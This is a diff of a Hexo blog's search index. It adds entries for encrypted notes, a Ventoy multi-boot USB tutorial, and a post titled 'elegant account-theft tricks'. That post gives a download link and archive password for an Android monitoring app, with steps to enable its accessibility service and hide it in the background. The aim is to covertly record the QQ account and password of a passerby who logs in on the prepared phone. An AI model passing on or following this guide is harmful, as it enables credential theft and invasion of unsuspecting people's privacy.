@@ -127,6 +127,82 @@
       </tags>
   </entry>
   <entry>
+    <title>基础Linux&amp;shell</title>
+    <url>/post/linux-teach/</url>
+    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
+  <script id="hbeData" type="hbeData" data-hmacdigest="f7afd80d4b071e118528029a9143771f9274eb1b0ce2656371b361fe4f48e222">1ac8257062fc56a3de8d7a31065f3f672628247548b66b5aea2bbc0e995cdccd7ca5306c7a83c11b90c7daf7ab550bf37c97af4d3bd6d008e14e507936dc2c56fb4839ff93d4bf5254c03178686aef790b7b8388fe32d7648bea0ac49290ae422ea6a865cba6bf718fb33a8f3cdfa250f7f8cc2de1606c7e2dc1ae6e4f56d79e7d8bb9933eb380482dbe751a6a4026fd9ccc34facbfe4107da837b4f908ff9302cb4eb4eed17440130d749c4d792b43b9b29f897663fb3270d20cddb461accdd23728ce04f2fd311da2bcb88ab84f31b39e6b19a2605b1cbe5e0a9a3f0e63d4d6815485ee527483137b5dd2afff34182059a46f9014176b1970d20a3466fce29044621ea1b50ebb0c1cad1a3020f44eebee63a1d3b355c90e5a737a79eeeafa8f9cb0330729e3befcded6114a777a9458108753a61dd94232a9ff4601c714d1909fab7f6ab81d7bea644eb8f3cf433d356a4b82ebfa45d97331169db08af1ef2ba7a32ac74120503b29b607095f16bda3d54e79b2713f345c9845a233791a661d31c6bdf74e9811e8458fe3d6864129261a0e6d65a48d21d6dd6c665bf9ddf287d8d5cf654caaed6b8407c1792d2426df7f704d30f7eb385dc5650a7d97a1e8772585e156605093b4fe5536facdd70fa7716fcb806d0a94c8db33b485d43b90693f0b7f42f6c353f57d2290c3b72f407dd1dd6bc6dce07b7279e6a82adc82f86050b9ff9f9ecd3992f852dea623d368d5ba5efc153863fe596c2e14f3db4e6495d772b5821c663cccda18c37dcbcfa6d69966675b173c8f85e2751053c733b6137ca2a12f5f7dd69c5d4976118d337e7edcc84e810bee7e8d92e7cf6b9d0b02379d90bd1865a0d2dcf74bcae20b4e08f80cb19b4e20116894f3abba04d6725314dd70f40f81f2756cd423cf36a550cf26a689f250d9f636e57c6bc4f657347bc6471c5f848c3bb5eba0711b8cea74ccab31e183971f28fae02d33f3e077a71b46626ffc370e698f865a852f12a56ffa9e5188befc335ca48c3cb4230cedb270ceca7dc9261fde8e7fbd4b4e9b85961495f81b8e03b312a7b010c9648f275eebe31de2f93fbc362d28a1389485e5ee64f532560fba1ce27acf8666355049dbdf8536df6d4eabe699487e7951c5d367d73f9cb35fe38438118d31b4dd4b064dab58142a70669b3772591078fc0bb8370c30231deb82ab994325bb0e764125f3f262de1bcd16d372a9425465faf3c5ca04926e2e5d544e473c8cb3511648d525837ec8bb0fd504a5394af836a126cdda113143a049edec5c24e1bc2d035415ce3b76a4ea993da30e7c380c273c45120daf6d95004c40a6d067e329c4d22322802c357c004f17e253264331d5f078e2ee60f8810321433245cacbd99a0c8594778760004dac4f9f505eb51b5dcd9ca748faf29ed12d8398145e64a8d8233a7c30a3b10c5e07d9800b667868a41728de326ef8540a8f4318b3e3c0918396aeaaab8243385994b4cf2aeb0438f2f85addf3bfe4892766aac364a6d051ad6b6a590099f38bc08897a563860052b0c0fafb9f496c3a86586fa2dae5d637bf1159f4f03990e6fd177623de66dd7bd6f749333b16fb04c770adb0b6b790be586991a3a3ed481f8cb77c5068b7dcbf076d08c901bbbc762d00d50b702420c309ac986f80b556be1a849e5e13e68d90a5847fffd438ecc202858bd660637caeacffb965b97c6a618b814dda0961914098b748ed58a8cae377b739d2d760482acfe23c35208754fdcf9c00605f5b6b59d701cfdbf6155c7cd6bcbff0887445c5119dacf2615de4b907a697429c328d007eba6d127df2d07ec215e6a6ba4077e4dac72819849e88688dc3989badd7b958568e1dab89b567dc87c9dc83455bd00dd438d8ee98b8e8722be55410f199f5fe482270ecce76fa90fd0a0c3ab99c07d68a51e04dcd0bde232e1c56e47d0645a3d66692f0f8520d5dcb1d54b133703cf44076f1db1b6edda47ebbd3958a0f4e8cb16928a507c91483a7c58fbb41575154e88f06593479ce36594b09d2bffe1dc6b825cf75eb1ee5f1a387ee22de592cf6aeb2413a75ecded7e33787defb74431586674359770fb21dbe6a0da94ae6afb59f5db65615cbd6892b8a00bb4a8966299d73debd21d4646917e51e61bbf8e5a55f143e95e24c4eea1d942de5776a8f2758e517186145c134f66526cfe63d856f61e484caf69d16c2f1e625eb7b13e76d055175547dd45e564bf51e757806b1af9fd4293eb5c537a75746d8c199e0bfbf1127b75367c68a496875053e83e116ec55209f1f7ef96d5ec33cc5fa0da0f3a8a97a55a4ca0685614265f28e16427e1cd15e5c7c5434950910f5ca024a336fd9eb4cc99911465ec72a841d756964b3d58e369daea709d57c4fe32af26c02bab79c6a7be37b23df433080896741d53059811e3a94175fc40d604a7652a62596b0f5fe4f93f228f2595468e1d16f62f1115f52f7b66dbeae10cc50d6e5bf46bb783407647f3c86f02911c93133337e04cbc17158508675f655aa68e95f68f9a56746bfb158277370b708547b7a1856289ea1921ee1ed10dc73f2a8ffc4f272834e148a7518f54e785dc1076dced6f584c597bea1597d516fb61d672262fcc5f99274471d6d18df24ea3e2b804d913ec06d6b6eb767977919cc32957c8e3b60709ab9e2e9959aa44691d4beb1e6d58b906e015f7c374e23a5018b0c8d965047d11c47263416fade44c21d7bd6c241ae0a7be7b654598e529ce15dbd3640c86e43943ac0378acf27abc997b3ac8bf07f57a2fc9183ce65fc4d6bdb17e7826eed8e14f2a5e7525282438853270cc80bddfbaf2761f669f1102f3f69409d978fa6e7142df16797629bb1f347494f40914a082774260c435425da8798c064c4e3f2c1bafd2525d3c715f58c2d3173bbe13ec9007d35dda6681e265b9d5da32ed51dc1b91b9a25eb4ccef30ff732082c02e33b24fa9e84cbee913f9615cf8245d0d39138eb615ab9fb81a84bb6de5b9c2597f8e39f2c17501d331bbd9a683c599ccd4d9fba3fea8fcf98bd1e005f713f869e56b7609773211f4bba5c66b8e7398dacaa519508fbba27e1b451889fc8f7c1ca717988925af09154becd1383d40d078e70397dcb2ab3fffb9553806dd425d429da921f83ad02edd8148b62ba90df52c2339268fcc9f4e183dfb04b25e296fa081ca520303b41da4d783f5d21b154b3d00cf629013061cf0a903896f0755e7229bc71782e01863f5c6e3baf393f07e732d26e2df921ce725e67a7a9692894d458c743830ad2c1ef7d8be716fcea1d8210e60f9d3af20ffb5e588d71b6cc7e0067d7925076e61ff6fe9b4373c01e2201a3783db3f4ca791de077bcf0e4a107a6dc199da12939a6227496bcad3a16d6a949dc3c982354bc96528dd4cee827281a370fd64413b948abcd78b70dfe4869c0ec6fe84fb86063ab5cfcb2a53046c87bc50669ddd8bad69700935c52ce2de28198aa02a9821451eb69a690b86ee7a7681a64d09084216d9610b67dfd711df0cb8c378674314d251a38d415b8613f77424f1c02640f5ca143511fc20040533044ed619605ff77d1be1d582b07be67340daa7dfe24ef00bddefee</script>
+  <div class="hbe hbe-content">
+    <div class="hbe hbe-input hbe-input-default">
+      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
+      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
+        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
+      </label>
+    </div>
+  </div>
+</div>
+<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>信息论与编码基础</title>
+    <url>/post/information/</url>
+    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
+  <script id="hbeData" type="hbeData" data-hmacdigest="ae09c982dba744cc2b3e01a4db217572fb58c658a7ddf86599fa4f13ac09a834">1ac8257062fc56a3de8d7a31065f3f672628247548b66b5aea2bbc0e995cdccd7ca5306c7a83c11b90c7daf7ab550bf37c97af4d3bd6d008e14e507936dc2c56fb4839ff93d4bf5254c03178686aef790b7b8388fe32d7648bea0ac49290ae422ea6a865cba6bf718fb33a8f3cdfa250f7f8cc2de1606c7e2dc1ae6e4f56d79e7d8bb9933eb380482dbe751a6a4026fd9ccc34facbfe4107da837b4f908ff9302cb4eb4eed17440130d749c4d792b43b9b29f897663fb3270d20cddb461accdd23728ce04f2fd311da2bcb88ab84f31b39e6b19a2605b1cbe5e0a9a3f0e63d4d6815485ee527483137b5dd2afff34182059a46f9014176b1970d20a3466fce29044621ea1b50ebb0c1cad1a3020f44eebee63a1d3b355c90e5a737a79eeeafa8f9cb0330729e3befcded6114a777a9452c2f04edb51ef276b6dad8f34c5858da0fc247d2bbebd1d8ceeefb5ec9e3dfa4b5d8d1048d872c1be48bce2cee74e895a14b155017c9f2c8ea5352ba13e796840301c92cbbe96d50a405528e4a48d5195de0181a72e76f5d6b6355f798d6c705c20e835c8bbafb1db98e7720bb5f6773cd8d492f5a68cde8529dc5a135b2f1aedda41a59c7168e4ab0209f857fff9edd2991c4e95eb9c0967b2120d7b8f05b841ae022d0b56e1b448243debc07d02924ba27ecc346618553988a094414c5e25093ae7e07873f8eb884661f2355a3cb0f1be11f86ad6de0c10d9eb832092cac041a6362352601c7d9d5f4927b8b31a5e13021c513e3ff49ca5804a4c85b36805622903d93e25c1d10370260135ed5b6787ef6486d95b0c66cf26614eae7421b189fd08183f3564c6a87e13271530b4b9f72f14671016f3a0d9cea129452eb35d7931d251e77f1be9c76e618bcdf147c32ad1a7eb2ecb1d8b7a5e747b93650c3d4afedfc9772ebea0efc209ce119c35934e817ada96c45c41a35e70ed84096700a2701834a3f451cc603a7b578904d1ccfb671effdc289283623df958877793e133dfc6909967acbce9e761e628a3d6b5ae273875ce691fc5ba43f601b8550c4f714af521a636a75335bc9ac781c8c2bce8361cbe511ed6f8e158de835fef891e60ff46aae7073aae58fb5349cb27b0989dfe4aa6783744fc7d97d06ffd30b110c6ba5be34aafe57593818a159a7e31ac3b3ebda4aefbafaa8ebcf9ff6235aff86e412c6f896b85c4f35ee0519faaa4e018dae97d95163c95e082cde8e294b817fb11d1ab1d13e7ecd77037a030a4f83ea4b6d9c7fe2839563307e4e38302c6f13486cd852c7d8b1995ce9febd4171283d233172b9a9a16cf02e51e269afcd0603c5b3cbdde4406aca1594939fb2cdc65ff93c30a1afefbadba968efead98ce2c15244e1b628e4661e734ee307a15ea00a4f53030cfd677a0962b86e8919b38d6ac2658992e427501cd9792ee821ce4712b52a20c3f6b5627112357e5ce656320790fae979a1c4bf1fdaa5cbe616574b750a4f1d8867731d2fcb1832f5532d2b1fc459dc127983fd00a54b87dbf4e46b975f330d493b84c30c96f4861bbfef6a8f65f3dfcca739fc360bada574339f97e816a381dc4bc0591595381d657ebe6e4494e36daebb80224954b537177d3d14a47939aff30464ea75ddb4429b1f2059159e7cf791e27a1d04fbcb7df2c027bed4aa1f9b789bf6316a58a0af6022c6b316d60974c4a85fc854e01ca5234fbebcbf816aad873c4ae70c22fa64d995ad2082f64c547f4a63da32061b736697a89a0bacc1e9888c20f4c730da86ea5ea0626f57b4d4dff330138eda5fcd5b3437fe33c1acdefbe9902f888e2ea61898324723f061e5f1103af6685cff5ea3f520d267d645ad2abc97ac036a8f3cd4f9bbbce1aaea801146db60d8a8974330bd8dffe654e46ea488f5b58fcb4c72f946fd994c1ac175b66179678c0e54299815a80f0d137b6c72060ba8056176d7d407ae878a995f24ba9a0da31d481253662d7635938cc8347eb1241f0ad1c538cbc38cfa1c9a79b0c1ed6c5f3ed850ed38180f6429283a7176af6178e96fa51cfb47f3dfe252763108f3c35a3b6e670ce55ef0f2abe6da5ad5ba0e64c2cb9b803145ac3a13ff26f57456d765f4657cd59635f054af010b8bc24276afa2751dbabe62de6b9d42bdb531605f56fd83fe0c7a431dfca8162a427b21fbbcbe95209c8813c24313d7a5c32c8be74227efff6b783e6bcaa9018635b1f97594b58d142d106b0f54f79daefbb3c0e580f3b06c62738244b14ab329069da3371b3b1b9955faaa29332ba337d80c41374df427fadcc9faf1dbf5a35a86eeabd55821a0e84f744037467ac68bcfb58ad621032b9734ce9a7a6dcc5d6447c36c53982fef2961f8e8a811324a2207fb288711f53d23a957421d73d820bdeaa23afdd0090ba94493c79d3c599f978cc59e75f48e7082702737dc42386f026dd619cb73456e011b1ef10d6be85ddfd546c68aa9bc8701cec6da5dd28657b4037d2f62c612a5b4f1ce539382b17605a52ef9bb59e8c4b8abaa4fab0a9d8ed93a095ceee60be69f3839af9f9e37b87011704bc867f9af1c013b8e1f6d64bcf4e0bbf5e8e5fd3319235c07bb3a1180f6609b675e8706b027c0cbab3ad4d64fb4d650da4da29e41cf4e336a1b4889206e4ab4dad5bbcf5edc53080a6e6182094eaa18ff171a345019b9237066a055a3dad8a19b91a93302f42cda30a4f90b23ab9dc8b2800f0778906700040eb9337871780cb306f15219abe7bddcd82f125bf28e1e18aa3a58687a5e7de6b2440390f2e204b07d953681a5ef6bc3ae28eacc259f1965579fe20232cb3cfb5f95030ce4a2b3600bb77af53b2915fc8c9e7a8da23b74ce79c34cd4e38a6b8a330914a2ca1a8e32192e5f6357a3713cbb17c86426fbf9e1df4738b6c27f4ea60c42e13a1f09a45b6348c8e9e34ac5fd360cfef76b4225276d9beefa6d01cf9407837061430793ac32321dbba0a2dfd17a6d7ecc8003384888a39d46bfc94031287ba12d7010b89a4622036e65500ab6680cb98773f61c3b19c62dce5fc82d12911457e9425093f56f53f5173a900b68bba46a653542cd7409dd6eed90739cb2cb5750819255f1fbf8537d8c2f0a365713858471e313a707cec308956ed9daf54e0d0108f22ee32e82086ac3ccb294428321a3709f63ddeeed4013e52850facc927d0337ac2fc1133907b082be033ddb1615fc6c97f8176cb73a7a99dcb31d019f6dded930890fbf4841281957741ade29dba05248c776bd040f1f7d02352266c16aa27e46b75254fb7ced033e83449954e7812c2bbd13098c825705f7a9d9e284fb50c420525dd8807b711ffdeb2b9003bdbef3fb6c6d7ed7391ec4d089333c39ccefa46ed3aa7690ad2858c3717db769abcea9369add8dcfc804bab401b6f2441ad335b70dfaa5b55434e12059ce9611a4648ba393b7975bd6da9acdaa2c8340fe2021bc8f9a40d2da9e1a14d68ff16e3f171f797f1513fb611e16c623da57a1f9e18d739d5872ca39c619ac4263be3f3942a036ed879b002b89cdb0fd8fa85dc5d83430720216fec5daf52b2aa45a6ff72fe11f86186249a975d174523080326c67</script>
+  <div class="hbe hbe-content">
+    <div class="hbe hbe-input hbe-input-default">
+      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
+      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
+        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
+      </label>
+    </div>
+  </div>
+</div>
+<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>信息论</tag>
+        <tag>编码</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>优雅的盗号技巧</title>
+    <url>/post/qq-passwd/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p><strong>由于此文章、<a href="https://www.findlaw.cn/hetong/ft590/">不可抗力</a>、意外事件导致的侵权事件  , 作者概不负责 , 请自行承担责任</strong></p>
+<p><em><span id="more"></span></em></p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p><strong>使用特定安卓软件的监测功能来记录账号和密码</strong> , <del>熟人作案吗</del></p>
+<h2 id="教程"><a href="#教程" class="headerlink" title="教程"></a>教程</h2><ul>
+<li><p><a href="https://www.lanzoui.com/ihnxu08god6d">软件</a></p>
+<blockquote>
+<p>密码2181 , 压缩包有安装包和一个面具模块 , 建议使用模块刷入避免不必要的bug</p>
+</blockquote>
+</li>
+</ul>
+<ol>
+<li><p>安装软件后按提示打开软件无障碍服务</p>
+</li>
+<li><p>将软件隐藏至后台运行 , <code>建议软件使用后台保护,这样在杀掉后台界面的同时保持软件的正常工作</code></p>
+</li>
+</ol>
+<h2 id="选择平台"><a href="#选择平台" class="headerlink" title="选择平台"></a>选择平台</h2><p>这里选择QQ作为演示 , 打开登录界面将你准备好的设备给你的(路人A)登录</p>
+<p><img src="/images/qq-passwd.png" loading="lazy"></p>
+<center>提前打开密码显示按钮</center>
+
+<p><strong>如果路人A有相对良好信息安全意识大概率会重新点上密码隐藏</strong>,这时软件就只能记录账号</p>
+<p><img src="/images/Type-qq.png" loading="lazy"></p>
+<p>这其中涉及到了<a href="https://wiki.mbalib.com/wiki/%E4%BF%A1%E6%81%AF%E9%9A%90%E8%97%8F">信息隐藏技术</a>来保证信息所有者保护数据的隐密性</p>
+<h2 id="【Android初级】密码显隐实现"><a href="#【Android初级】密码显隐实现" class="headerlink" title="【Android初级】密码显隐实现"></a><a href="https://zhuanlan.zhihu.com/p/348039376">【Android初级】密码显隐实现</a></h2><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+  </entry>
+  <entry>
     <title>我的md笔记</title>
     <url>/post/practice/</url>
     <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
@@ -146,6 +222,43 @@
       </categories>
       <tags>
         <tag>Markdown</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>来给你的u盘实现一盘多系统</title>
+    <url>/post/ventory/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><img src="/images/ventoy-logo.png" alt="ventoy" loading="lazy"><em><span id="more"></span></em></p>
+<h2 id="Ventoy"><a href="#Ventoy" class="headerlink" title="Ventoy"></a>Ventoy</h2><p><img src="/images/ventoy-menu.png" alt="界面" loading="lazy"></p>
+<center>UI</centry>
+</center>
+
+<p>有了Ventoy你就无需反复地格式化U盘,你只需要吧 ISO/WIM/IMG/VHD(x)/EFI 等类型的文件拷贝到U盘里面就可以启动了,无需(换系统反复重新写盘)其他操作。ventoy与普通U盘启动器来说ventoy制作的U盘<strong>仍然可以作为一个普通U盘存储文件</strong></p>
+<hr>
+<center>一个U盘通吃200多款操作系统安装</center>
+
+<p>你可以一次性拷贝多个不同类型的镜像文件,Ventoy会在启动时显示一个菜单供你选择,支持大部分常见类型的操作系统其中包括主流的 Windows11 /Win10 /8.1 /8 /7 ,WinPE(PE系统等等) Ubuntu CentOS Debian Linux …</p>
+<h2 id="制作启动器"><a href="#制作启动器" class="headerlink" title="制作启动器"></a>制作启动器</h2><h3 id="软件部署"><a href="#软件部署" class="headerlink" title="软件部署"></a>软件部署</h3><p>官网下载相应版本后,分区类型选择MBR兼容性好,然后开始安装一个U盘启动器就做好了,期间会格式化U盘</p>
+<h3 id="U盘部署"><a href="#U盘部署" class="headerlink" title="U盘部署"></a>U盘部署</h3><p>随意选择U盘目录将系统文件复制到U盘 比如我的是&gt;&gt;/IMG</p>
+<h2 id="从U盘启动"><a href="#从U盘启动" class="headerlink" title="从U盘启动"></a>从U盘启动</h2><p><img src="/images/efi.jpg" alt="efi" loading="lazy"></p>
+<p>重启进入EFI选择U盘名字,以上是不同品牌EFI快捷键</p>
+<hr>
+<h3 id="DIY"><a href="#DIY" class="headerlink" title="DIY"></a>DIY</h3><blockquote>
+<p>好的瑞士军刀怎么能少的了DIY呢</p>
+</blockquote>
+<p>在U盘根目录新建<code>themes</code>文件夹,由于更改主题需要编译json文件所以ventoy自带了VentoyPlugson方便傻瓜式操作</p>
+<p><a href="https://www.gnome-look.org/browse?cat=109&ord=latest">GRUB Themes - Gnome-look.org</a>在里面下载你喜欢的主题.tg,解包后再解压知道只有文件夹,放到你的themes文件夹</p>
+<p>找到你的ventoy安装路径打开<code>VentoyPlugson.exe</code>选择启动; 或者点击链接<a href="http://127.0.0.1:24681/">链接</a></p>
+<p>选择主题插件设置你的主题样式,教程就结束了!</p>
+<h3 id="UI"><a href="#UI" class="headerlink" title="UI"></a>UI</h3><center>在界面使用F5可以切换主题</center>
+
+<p><img src="/images/theme-ventoy.png" alt="ventoy" loading="lazy"></p>
+<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
+      <categories>
+        <category>刷机</category>
+        <category>windows</category>
+      </categories>
+      <tags>
+        <tag>u盘</tag>
       </tags>
   </entry>
   <entry>
@@ -197,88 +310,6 @@
       </categories>
       <tags>
         <tag>服务器</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>信息论与编码基础</title>
-    <url>/post/information/</url>
-    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
-  <script id="hbeData" type="hbeData" data-hmacdigest="ae09c982dba744cc2b3e01a4db217572fb58c658a7ddf86599fa4f13ac09a834">1ac8257062fc56a3de8d7a31065f3f672628247548b66b5aea2bbc0e995cdccd7ca5306c7a83c11b90c7daf7ab550bf37c97af4d3bd6d008e14e507936dc2c56fb4839ff93d4bf5254c03178686aef790b7b8388fe32d7648bea0ac49290ae422ea6a865cba6bf718fb33a8f3cdfa250f7f8cc2de1606c7e2dc1ae6e4f56d79e7d8bb9933eb380482dbe751a6a4026fd9ccc34facbfe4107da837b4f908ff9302cb4eb4eed17440130d749c4d792b43b9b29f897663fb3270d20cddb461accdd23728ce04f2fd311da2bcb88ab84f31b39e6b19a2605b1cbe5e0a9a3f0e63d4d6815485ee527483137b5dd2afff34182059a46f9014176b1970d20a3466fce29044621ea1b50ebb0c1cad1a3020f44eebee63a1d3b355c90e5a737a79eeeafa8f9cb0330729e3befcded6114a777a9452c2f04edb51ef276b6dad8f34c5858da0fc247d2bbebd1d8ceeefb5ec9e3dfa4b5d8d1048d872c1be48bce2cee74e895a14b155017c9f2c8ea5352ba13e796840301c92cbbe96d50a405528e4a48d5195de0181a72e76f5d6b6355f798d6c705c20e835c8bbafb1db98e7720bb5f6773cd8d492f5a68cde8529dc5a135b2f1aedda41a59c7168e4ab0209f857fff9edd2991c4e95eb9c0967b2120d7b8f05b841ae022d0b56e1b448243debc07d02924ba27ecc346618553988a094414c5e25093ae7e07873f8eb884661f2355a3cb0f1be11f86ad6de0c10d9eb832092cac041a6362352601c7d9d5f4927b8b31a5e13021c513e3ff49ca5804a4c85b36805622903d93e25c1d10370260135ed5b6787ef6486d95b0c66cf26614eae7421b189fd08183f3564c6a87e13271530b4b9f72f14671016f3a0d9cea129452eb35d7931d251e77f1be9c76e618bcdf147c32ad1a7eb2ecb1d8b7a5e747b93650c3d4afedfc9772ebea0efc209ce119c35934e817ada96c45c41a35e70ed84096700a2701834a3f451cc603a7b578904d1ccfb671effdc289283623df958877793e133dfc6909967acbce9e761e628a3d6b5ae273875ce691fc5ba43f601b8550c4f714af521a636a75335bc9ac781c8c2bce8361cbe511ed6f8e158de835fef891e60ff46aae7073aae58fb5349cb27b0989dfe4aa6783744fc7d97d06ffd30b110c6ba5be34aafe57593818a159a7e31ac3b3ebda4aefbafaa8ebcf9ff6235aff86e412c6f896b85c4f35ee0519faaa4e018dae97d95163c95e082cde8e294b817fb11d1ab1d13e7ecd77037a030a4f83ea4b6d9c7fe2839563307e4e38302c6f13486cd852c7d8b1995ce9febd4171283d233172b9a9a16cf02e51e269afcd0603c5b3cbdde4406aca1594939fb2cdc65ff93c30a1afefbadba968efead98ce2c15244e1b628e4661e734ee307a15ea00a4f53030cfd677a0962b86e8919b38d6ac2658992e427501cd9792ee821ce4712b52a20c3f6b5627112357e5ce656320790fae979a1c4bf1fdaa5cbe616574b750a4f1d8867731d2fcb1832f5532d2b1fc459dc127983fd00a54b87dbf4e46b975f330d493b84c30c96f4861bbfef6a8f65f3dfcca739fc360bada574339f97e816a381dc4bc0591595381d657ebe6e4494e36daebb80224954b537177d3d14a47939aff30464ea75ddb4429b1f2059159e7cf791e27a1d04fbcb7df2c027bed4aa1f9b789bf6316a58a0af6022c6b316d60974c4a85fc854e01ca5234fbebcbf816aad873c4ae70c22fa64d995ad2082f64c547f4a63da32061b736697a89a0bacc1e9888c20f4c730da86ea5ea0626f57b4d4dff330138eda5fcd5b3437fe33c1acdefbe9902f888e2ea61898324723f061e5f1103af6685cff5ea3f520d267d645ad2abc97ac036a8f3cd4f9bbbce1aaea801146db60d8a8974330bd8dffe654e46ea488f5b58fcb4c72f946fd994c1ac175b66179678c0e54299815a80f0d137b6c72060ba8056176d7d407ae878a995f24ba9a0da31d481253662d7635938cc8347eb1241f0ad1c538cbc38cfa1c9a79b0c1ed6c5f3ed850ed38180f6429283a7176af6178e96fa51cfb47f3dfe252763108f3c35a3b6e670ce55ef0f2abe6da5ad5ba0e64c2cb9b803145ac3a13ff26f57456d765f4657cd59635f054af010b8bc24276afa2751dbabe62de6b9d42bdb531605f56fd83fe0c7a431dfca8162a427b21fbbcbe95209c8813c24313d7a5c32c8be74227efff6b783e6bcaa9018635b1f97594b58d142d106b0f54f79daefbb3c0e580f3b06c62738244b14ab329069da3371b3b1b9955faaa29332ba337d80c41374df427fadcc9faf1dbf5a35a86eeabd55821a0e84f744037467ac68bcfb58ad621032b9734ce9a7a6dcc5d6447c36c53982fef2961f8e8a811324a2207fb288711f53d23a957421d73d820bdeaa23afdd0090ba94493c79d3c599f978cc59e75f48e7082702737dc42386f026dd619cb73456e011b1ef10d6be85ddfd546c68aa9bc8701cec6da5dd28657b4037d2f62c612a5b4f1ce539382b17605a52ef9bb59e8c4b8abaa4fab0a9d8ed93a095ceee60be69f3839af9f9e37b87011704bc867f9af1c013b8e1f6d64bcf4e0bbf5e8e5fd3319235c07bb3a1180f6609b675e8706b027c0cbab3ad4d64fb4d650da4da29e41cf4e336a1b4889206e4ab4dad5bbcf5edc53080a6e6182094eaa18ff171a345019b9237066a055a3dad8a19b91a93302f42cda30a4f90b23ab9dc8b2800f0778906700040eb9337871780cb306f15219abe7bddcd82f125bf28e1e18aa3a58687a5e7de6b2440390f2e204b07d953681a5ef6bc3ae28eacc259f1965579fe20232cb3cfb5f95030ce4a2b3600bb77af53b2915fc8c9e7a8da23b74ce79c34cd4e38a6b8a330914a2ca1a8e32192e5f6357a3713cbb17c86426fbf9e1df4738b6c27f4ea60c42e13a1f09a45b6348c8e9e34ac5fd360cfef76b4225276d9beefa6d01cf9407837061430793ac32321dbba0a2dfd17a6d7ecc8003384888a39d46bfc94031287ba12d7010b89a4622036e65500ab6680cb98773f61c3b19c62dce5fc82d12911457e9425093f56f53f5173a900b68bba46a653542cd7409dd6eed90739cb2cb5750819255f1fbf8537d8c2f0a365713858471e313a707cec308956ed9daf54e0d0108f22ee32e82086ac3ccb294428321a3709f63ddeeed4013e52850facc927d0337ac2fc1133907b082be033ddb1615fc6c97f8176cb73a7a99dcb31d019f6dded930890fbf4841281957741ade29dba05248c776bd040f1f7d02352266c16aa27e46b75254fb7ced033e83449954e7812c2bbd13098c825705f7a9d9e284fb50c420525dd8807b711ffdeb2b9003bdbef3fb6c6d7ed7391ec4d089333c39ccefa46ed3aa7690ad2858c3717db769abcea9369add8dcfc804bab401b6f2441ad335b70dfaa5b55434e12059ce9611a4648ba393b7975bd6da9acdaa2c8340fe2021bc8f9a40d2da9e1a14d68ff16e3f171f797f1513fb611e16c623da57a1f9e18d739d5872ca39c619ac4263be3f3942a036ed879b002b89cdb0fd8fa85dc5d83430720216fec5daf52b2aa45a6ff72fe11f86186249a975d174523080326c67</script>
-  <div class="hbe hbe-content">
-    <div class="hbe hbe-input hbe-input-default">
-      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
-      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
-        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
-      </label>
-    </div>
-  </div>
-</div>
-<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
-      <categories>
-        <category>笔记</category>
-      </categories>
-      <tags>
-        <tag>信息论</tag>
-        <tag>编码</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>来给你的u盘实现一盘多系统</title>
-    <url>/post/ventory/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><img src="/images/ventoy-logo.png" alt="ventoy" loading="lazy"><em><span id="more"></span></em></p>
-<h2 id="Ventoy"><a href="#Ventoy" class="headerlink" title="Ventoy"></a>Ventoy</h2><p><img src="/images/ventoy-menu.png" alt="界面" loading="lazy"></p>
-<center>UI</centry>
-</center>
-
-<p>有了Ventoy你就无需反复地格式化U盘,你只需要吧 ISO/WIM/IMG/VHD(x)/EFI 等类型的文件拷贝到U盘里面就可以启动了,无需(换系统反复重新写盘)其他操作。ventoy与普通U盘启动器来说ventoy制作的U盘<strong>仍然可以作为一个普通U盘存储文件</strong></p>
